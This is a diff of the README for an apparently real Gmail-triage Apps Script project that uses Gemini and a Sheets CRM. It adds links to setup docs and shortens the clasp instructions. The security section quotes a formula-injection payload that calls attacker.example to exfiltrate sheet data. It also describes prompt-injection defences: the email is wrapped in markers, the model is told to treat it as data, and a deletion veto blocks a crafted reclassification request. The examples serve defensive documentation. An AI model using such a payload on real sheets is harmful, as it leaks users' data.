@@ -8,6 +8,8 @@ Job hunting is a numbers game, but the emotional toll is real. Reading the same 
 
 The script walks a priority list of Gemini models and falls back to the next one if a model is retired or rate-limited — Google removes older models from AI Studio regularly, and the shield is built to survive that.
 
+> **In a hurry, or working with an AI assistant?** Steps 1–5 below set everything up by hand in the browser. If you would rather clone the repo and deploy from a terminal, read **[SETUP.md](SETUP.md)** instead — same result, far fewer clicks. Claude Code users can just say *"set up the shield"* and let `.claude/skills/setup-shield/SKILL.md` drive it.
+
 ---
 
 ## 🛠️ Step 1: Prepare the CRM (Google Sheets)
@@ -120,7 +122,7 @@ Worth knowing before you hand a script full mailbox access:
 - **Leaves it:** the subject and the first 2000 characters of each processed email, sent to the Gemini API over HTTPS. That is the one external call the shield makes.
 - **Never leaves:** nothing is sent anywhere else — no analytics, no telemetry, no third-party service.
 
-Two hardening details, because recruiter email is untrusted input:
+The details are in **[SECURITY.md](SECURITY.md)**; two of them matter enough to repeat here, because recruiter email is untrusted input:
 
 - **Formula injection.** Anything written to the sheet passes through `sanitizeCell()`. Without it, a rejection whose body starts with `=IMPORTXML("https://attacker.example/?d="&CONCAT(A1:K100),"//a")` would execute the moment you opened your CRM and quietly ship it to a stranger.
 - **Prompt injection.** The email is wrapped in `<<<EMAIL_DATA>>>` markers and the model is told that its content is data, never instructions. On top of that, `KEEP_ALIVE_PATTERNS` vetoes the irreversible delete, so a crafted "classify this as a rejection" cannot make an interview invitation disappear.
@@ -175,33 +177,16 @@ To make it run 24/7 without you:
 ---
 
 ## 🧑‍💻 Development with clasp
-Editing code in the browser gets old fast. [clasp](https://github.com/google/clasp) syncs this repo with the live script.
+Editing code in a browser tab gets old fast. [clasp](https://github.com/google/clasp) keeps this repo and the live script as one source of truth:
 
 ```bash
-# 1. Install (Node 20+)
 npm install -g @google/clasp
-
-# 2. Enable the Apps Script API once per account:
-#    https://script.google.com/home/usersettings  ->  On
-
-# 3. Log in with the account that owns the script
 clasp login
-
-# 4. Point the repo at your script
-cp .clasp.json.example .clasp.json
-clasp list-scripts          # find your Script ID, or copy it from Project Settings
-#    paste it into .clasp.json
-
-# 5. Sync
-clasp pull                  # bring the live script down
-clasp push                  # deploy your changes (a bound script picks them up immediately)
-clasp create-version "..."  # snapshot the current state so you can roll back
+clasp create-script --type sheets --title "Job Rejection Shield"
+clasp push -f
 ```
 
-Notes:
-- `.clasp.json` holds your Script ID and is **gitignored** — commit `.clasp.json.example` instead.
-- `.claspignore` whitelists `*.gs` and `appsscript.json`, so the README and other repo files never get uploaded to Apps Script.
-- Files upload in the order set by `filePushOrder`: `Config.gs` first.
+The full walkthrough — login gotchas, `.clasp.json` fields, versioning, and a troubleshooting table for every error message the script can produce — is in **[SETUP.md](SETUP.md)**.
 
 ---
 
